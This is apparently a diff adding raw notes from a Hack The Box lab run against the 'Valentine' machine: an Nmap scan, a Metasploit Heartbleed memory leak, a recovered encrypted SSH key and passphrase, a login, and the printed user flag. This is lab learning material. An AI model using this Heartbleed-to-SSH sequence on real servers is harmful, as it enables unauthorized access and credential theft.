@@ -1,0 +1,205 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 23:44 IST
+Nmap scan report for 10.10.10.79
+Host is up (0.13s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
+|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2018-02-06T00:45:25
+|_Not valid after:  2019-02-06T00:45:25
+|_ssl-date: 2019-07-24T18:05:28+00:00; -11m07s from scanner time.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=7/24%OT=22%CT=1%CU=36198%PV=Y%DS=2%DC=T%G=Y%TM=5D38A08
+OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS
+OS:(O1=M54DST11NW4%O2=M54DST11NW4%O3=M54DNNT11NW4%O4=M54DST11NW4%O5=M54DST1
+OS:1NW4%O6=M54DST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN
+OS:(R=Y%DF=Y%T=40%W=3908%O=M54DNNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M54DST11NW4%RD=
+OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
+OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
+OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -11m07s, deviation: 0s, median: -11m07s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   134.18 ms 10.10.14.1
+2   134.26 ms 10.10.10.79
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 145.73 seconds
+
+
+from hype key under dev
+
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+
+
+
+Heartbleed is there so msfconsole
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options
+
+Module options (auxiliary/scanner/ssl/openssl_heartbleed):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   DUMPFILTER                         no        Pattern to filter leaked memory before storing
+   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
+   MAX_KEYTRIES      50               yes       Max tries to dump key
+   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             443              yes       The target port (TCP)
+   STATUS_EVERY      5                yes       How many retries until key dump status
+   THREADS           1                yes       The number of concurrent threads
+   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
+   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   SCAN  Check hosts for vulnerability
+
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST 10.10.10.79
+RHOST => 10.10.10.79
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
+[*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > ahoq opriona
+ahoq [-] Unknown command: ahoq.
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options
+
+Module options (auxiliary/scanner/ssl/openssl_heartbleed):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   DUMPFILTER                         no        Pattern to filter leaked memory before storing
+   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
+   MAX_KEYTRIES      50               yes       Max tries to dump key
+   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
+   RHOSTS            10.10.10.79      yes       The target address range or CIDR identifier
+   RPORT             443              yes       The target port (TCP)
+   STATUS_EVERY      5                yes       How many retries until key dump status
+   THREADS           1                yes       The number of concurrent threads
+   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
+   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   SCAN  Check hosts for vulnerability
+
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
+verbose => true
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[*] 10.10.10.79:443       - Leaking heartbeat response #1
+[*] 10.10.10.79:443       - Sending Client Hello...
+[*] 10.10.10.79:443       - SSL record #1:
+
+
+
+root@root:~/Downloads/HTB/VIP/Valentine# nano hype_key
+root@root:~/Downloads/HTB/VIP/Valentine# ssh -i hype_key hype@10.10.10.79
+The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
+ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
+
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'hype_key' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "hype_key": bad permissions
+hype@10.10.10.79's password: 
+
+root@root:~/Downloads/HTB/VIP/Valentine# chmod 400 hype_key
+root@root:~/Downloads/HTB/VIP/Valentine# ssh -i hype_key hype@10.10.10.79
+Enter passphrase for key 'hype_key': 
+
+root@root:~/Downloads/HTB/VIP/Valentine# ssh -i hype_key hype@10.10.10.79
+
+Enter passphrase for key 'hype_key': 
+
+root@root:~/Downloads/HTB/VIP/Valentine# ssh -i hype_key hype@10.10.10.79
+heartbleedbelievethehype
+Enter passphrase for key 'hype_key': 
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+hype@Valentine:~$ cd Desktop
+hype@Valentine:~/Desktop$ ls
+user.txt
+hype@Valentine:~/Desktop$ cat user.txt
+e6710a5464769fd5fcd216e076961750
+hype@Valentine:~/Desktop$ sudo -l
+
+
+
+
+-------------------
+base64 deocder root@root:~/Downloads/tools/Linux/heartbleed-poc# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
+heartbleedbelievethehype
